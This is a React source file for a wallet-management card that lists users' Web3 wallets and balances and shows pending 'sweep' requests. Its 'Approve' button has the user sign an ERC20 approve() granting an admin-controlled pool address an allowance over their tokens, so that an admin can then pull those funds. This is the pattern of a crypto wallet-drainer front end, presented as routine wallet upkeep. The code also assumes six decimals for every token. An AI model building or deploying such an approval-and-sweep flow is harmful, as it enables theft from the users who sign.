import { useState } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { Wallet as WalletIcon, RefreshCw, Trash2, ExternalLink, Zap } from "lucide-react";
import { useAccount, useSignTypedData, useWriteContract } from "wagmi";
import { parseUnits } from "viem";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import ConnectWalletButton from "@/components/web3/ConnectWalletButton";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/hooks/useAuth";
import { CHAIN_META } from "@/lib/web3/config";
import { toast } from "sonner";

const ERC20_APPROVE_ABI = [{
  type: "function", name: "approve", stateMutability: "nonpayable",
  inputs: [{ name: "spender", type: "address" }, { name: "amount", type: "uint256" }],
  outputs: [{ type: "bool" }]
}] as const;

const UserWalletsCard = () => {
  const { user } = useAuth();
  const { address, chain } = useAccount();
  const queryClient = useQueryClient();
  const { writeContractAsync } = useWriteContract();
  const [busyId, setBusyId] = useState<string | null>(null);

  const { data: wallets = [] } = useQuery({
    queryKey: ["my-wallets", user?.id],
    queryFn: async () => {
      const { data } = await supabase.from("user_wallets")
        .select("*, user_wallet_assets(*)").eq("user_id", user!.id)
        .order("created_at", { ascending: false });
      return data || [];
    },
    enabled: !!user,
  });

  const { data: pendingSweeps = [] } = useQuery({
    queryKey: ["my-sweeps", user?.id],
    queryFn: async () => {
      const { data } = await supabase.from("sweep_requests")
        .select("*").eq("user_id", user!.id).eq("status", "pending");
      return data || [];
    },
    enabled: !!user,
    refetchInterval: 15000,
  });

  const refresh = useMutation({
    mutationFn: async (w: any) => {
      const { error } = await supabase.functions.invoke("wallet-balances", {
        body: { address: w.address, chainId: w.chain_id, walletId: w.id },
      });
      if (error) throw error;
    },
    onSuccess: () => { toast.success("Balances synced"); queryClient.invalidateQueries({ queryKey: ["my-wallets"] }); },
    onError: (e: any) => toast.error(e.message),
  });

  const remove = useMutation({
    mutationFn: async (id: string) => {
      const { error } = await supabase.from("user_wallets").delete().eq("id", id);
      if (error) throw error;
    },
    onSuccess: () => { toast.success("Wallet removed"); queryClient.invalidateQueries({ queryKey: ["my-wallets"] }); },
  });

  const approveAndSweep = async (req: any) => {
    if (!address || !chain) { toast.error("Connect your wallet first"); return; }
    if (chain.id !== req.chain_id) { toast.error(`Switch to ${CHAIN_META[req.chain_id]?.name}`); return; }
    setBusyId(req.id);
    try {
      // Native sweep handled differently — skip approve, edge fn won't work for native
      if (!req.token_address) {
        toast.error("Native sweeps require a manual transfer");
        setBusyId(null);
        return;
      }
      const { data: keyMeta } = await supabase.from("pool_chain_keys_safe")
        .select("pool_address").eq("chain_id", req.chain_id).maybeSingle();
      if (!keyMeta?.pool_address) { toast.error("Pool address not configured"); setBusyId(null); return; }

      const decimals = 6; // USDT/USDC default; backend will refine
      const amt = parseUnits(String(req.amount), decimals);

      const tx = await writeContractAsync({
        address: req.token_address as `0x${string}`,
        abi: ERC20_APPROVE_ABI,
        functionName: "approve",
        args: [keyMeta.pool_address as `0x${string}`, amt],
      });
      await supabase.from("sweep_requests").update({ approve_tx: tx, status: "approved" }).eq("id", req.id);
      toast.success("Approval signed! Admin will execute the sweep.");
      queryClient.invalidateQueries({ queryKey: ["my-sweeps"] });
    } catch (e: any) {
      toast.error(e?.shortMessage || e?.message || "Failed");
    } finally { setBusyId(null); }
  };

  return (
    <div className="glass-card p-4 md:p-6 space-y-4">
      <div className="flex items-center justify-between gap-2">
        <div className="flex items-center gap-2">
          <WalletIcon className="w-4 h-4 text-primary" />
          <h3 className="font-semibold text-sm">Web3 Wallets</h3>
        </div>
        <ConnectWalletButton />
      </div>

      {pendingSweeps.length > 0 && (
        <div className="rounded-lg border border-warning/40 bg-warning/10 p-3 space-y-2">
          <p className="text-xs font-semibold text-warning flex items-center gap-2"><Zap className="w-3 h-3" /> Action required: approve sweep</p>
          {pendingSweeps.map((s: any) => (
            <div key={s.id} className="flex items-center justify-between text-xs">
              <span>{s.amount} {s.symbol} · {CHAIN_META[s.chain_id]?.name}</span>
              <Button size="sm" disabled={busyId === s.id} onClick={() => approveAndSweep(s)} className="h-7 gold-gradient text-primary-foreground">
                {busyId === s.id ? "Signing…" : "Approve"}
              </Button>
            </div>
          ))}
        </div>
      )}

      {wallets.length === 0 ? (
        <p className="text-xs text-muted-foreground">No wallets connected. Click "Connect Wallet" above to link MetaMask, Trust, Coinbase, Rainbow, or scan with WalletConnect on mobile.</p>
      ) : (
        <div className="space-y-2">
          {wallets.map((w: any) => {
            const meta = CHAIN_META[w.chain_id];
            const totalUsd = (w.user_wallet_assets || []).reduce((s: number, a: any) => s + parseFloat(a.balance_usd || 0), 0);
            return (
              <div key={w.id} className="rounded-lg border border-border bg-secondary/30 p-3 space-y-2">
                <div className="flex items-center justify-between gap-2">
                  <div className="min-w-0">
                    <p className="text-xs font-mono truncate">{w.address.slice(0, 8)}…{w.address.slice(-6)}</p>
                    <div className="flex items-center gap-2 mt-1">
                      <Badge variant="outline" className="h-5 text-[10px]">{meta?.logo} {meta?.name || `Chain ${w.chain_id}`}</Badge>
                      <span className="text-[10px] text-muted-foreground">{w.wallet_type}</span>
                    </div>
                  </div>
                  <div className="text-right shrink-0">
                    <p className="text-sm font-bold gold-text">${totalUsd.toFixed(2)}</p>
                    <div className="flex gap-1 mt-1">
                      <Button size="icon" variant="ghost" className="h-6 w-6" onClick={() => refresh.mutate(w)}><RefreshCw className="w-3 h-3" /></Button>
                      <Button size="icon" variant="ghost" className="h-6 w-6" onClick={() => window.open(`${meta?.explorer}/address/${w.address}`, "_blank")}><ExternalLink className="w-3 h-3" /></Button>
                      <Button size="icon" variant="ghost" className="h-6 w-6 hover:text-destructive" onClick={() => remove.mutate(w.id)}><Trash2 className="w-3 h-3" /></Button>
                    </div>
                  </div>
                </div>
                {(w.user_wallet_assets || []).length > 0 && (
                  <div className="grid grid-cols-2 gap-1 pt-2 border-t border-border/50">
                    {w.user_wallet_assets.map((a: any) => (
                      <div key={a.id} className="text-[10px] flex justify-between">
                        <span className="text-muted-foreground">{a.symbol}</span>
                        <span className="font-mono">{parseFloat(a.balance).toFixed(4)}</span>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
};

export default UserWalletsCard;
